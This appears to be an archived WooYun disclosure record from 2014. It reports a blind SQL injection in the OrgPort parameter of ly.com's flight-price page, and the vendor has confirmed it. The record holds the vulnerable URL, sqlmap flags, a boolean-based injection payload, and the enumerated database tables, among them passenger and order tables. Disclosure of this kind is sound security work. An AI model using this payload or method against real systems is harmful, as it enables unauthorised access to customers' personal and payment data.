{"id": 2995, "wybug_id": "wooyun-2014-062473", "wybug_title": "苏州同程旅游网主站存在SQL注入漏洞", "wybug_corp": "苏州同程旅游网络科技有限公司", "wybug_author": "路人甲", "wybug_date": "2014-05-27 09:57", "wybug_open_date": "2014-07-11 09:58", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-06-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-06-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-11：\t细节向公众公开  简要描述： SQL注入 详细说明：  http://www.ly.com/flight/FlightPriceNew.aspx?ajax=GetPageData&OrgPort=CSX&DesPort=&Sort=&CurrPage=2 参数orgport存在盲注sqlmap知道数据库类型 --dbms=\"microsoft sql server\" --dbs看到这个http://wooyun.org/bugs/wooyun-2010-055900 官方说是老页面，就顺手看看新页面有没有，没有想到还真有。   漏洞证明：  sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: OrgPort    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: ajax=GetPageData&OrgPort=CSX' AND 7808=7808 AND 'rjNw'='rjNw&DesPort=&Sort=&CurrPage=2---web server operating system: Windows 2003web application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 6.0back-end DBMS: Microsoft SQL Server 2008current database:    'TCFly'sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: OrgPort    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: ajax=GetPageData&OrgPort=CSX' AND 7808=7808 AND 'rjNw'='rjNw&DesPort=&Sort=&CurrPage=2---web server operating system: Windows 2003web application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 6.0back-end DBMS: Microsoft SQL Server 2008Database: TCFly[60 tables]+-----------------------------------------+| dbo.Air_CabinCode                       || dbo.Air_Craft                           || dbo.Air_News                            || dbo.Air_PortCode                        || dbo.Air_WaysCode                        || dbo.AirportServiceDesk                  || dbo.FlightAirLine                       || dbo.FlightBookerHistory                 || dbo.FlightChangeOrder                   || dbo.FlightChangeOrderDetail             || dbo.FlightChangeOrderSelfDealLog        || dbo.FlightCnBus                         || dbo.FlightCoupon                        || dbo.FlightDP                            || dbo.FlightDPLog                         || dbo.FlightDelay                         || dbo.FlightETicketNOMonitor              || dbo.FlightFCAchievement                 || dbo.FlightFCWorkRecord                  || dbo.FlightFDCache                       || dbo.FlightFinanceOverdue                || dbo.FlightFinanceRefund                 || dbo.FlightFriendlyLink                  || dbo.FlightInsuranceOrder                || dbo.FlightLineStat                      || dbo.FlightMailRecord                    || dbo.FlightMerchant                      || dbo.FlightMerchantReturnStat            || dbo.FlightMerchantUrl                   || dbo.FlightMonitorETicketInfo            || dbo.FlightORAssignHistory               || dbo.FlightOrder                         || dbo.FlightOrderControlLog               || dbo.FlightOrderExtend                   || dbo.FlightOrderLog                      || dbo.FlightOrderRouteInfo                || dbo.FlightPassenger                     || dbo.FlightPicture                       || dbo.FlightPlatformProduct               || dbo.FlightPortFloor                     || dbo.FlightRejectOrder                   || dbo.FlightRejectRecord                  || dbo.FlightSKCache                       || dbo.FlightSPOrderRelation               || dbo.FlightSelfOrder                     || dbo.FlightSpecialPrice                  || dbo.FlightSystemUser                    || dbo.FlightTime                          || dbo.Flight_Wap_Mypassenger              || dbo.Flight_Wap_Order                    || dbo.IdGenerator                         || dbo.MSreplication_objects               || dbo.MSreplication_subscriptions         || dbo.MSsavedforeignkeycolumns            || dbo.MSsavedforeignkeyextendedproperties || dbo.MSsavedforeignkeys                  || dbo.MSsnapshotdeliveryprogress          || dbo.MSsubscription_agents               || dbo.SpecialsTicketCache                 || dbo.WebPayAccount                       |+-----------------------------------------+\n\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-05-27 10:37 厂商回复： 感谢提交，正在修复中 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-07-19 07:01 |    \t\tstomach \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:2        | 个人爱好！！纯的。。。。。)\t\t \n  说好的礼物呢！！！    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}